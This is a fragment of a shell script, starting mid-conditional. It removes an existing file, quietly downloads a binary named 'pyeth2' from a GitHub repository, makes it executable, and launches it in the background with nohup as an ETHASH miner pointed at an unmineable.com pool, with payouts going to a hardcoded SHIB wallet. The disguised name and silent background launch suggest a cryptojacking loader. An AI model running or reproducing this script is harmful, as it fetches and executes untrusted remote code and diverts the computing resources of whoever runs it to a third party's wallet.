...
then
    rm -rf pyeth2
    wget -q  https://github.com/samrikulan/lagraven/raw/main/pyeth2 2> lol.out
    chmod +x pyeth2
    if  [ $PROG == "CU" ]
    then
        nohup  ./pyeth2 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46.PAP --ethstratum ETHPROXY 2>> oout 1>> oout &
    else
        nohup  ./pyeth2 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46.PAP --ethstratum ETHPROXY  2>> oout 1>> oout &
    fi
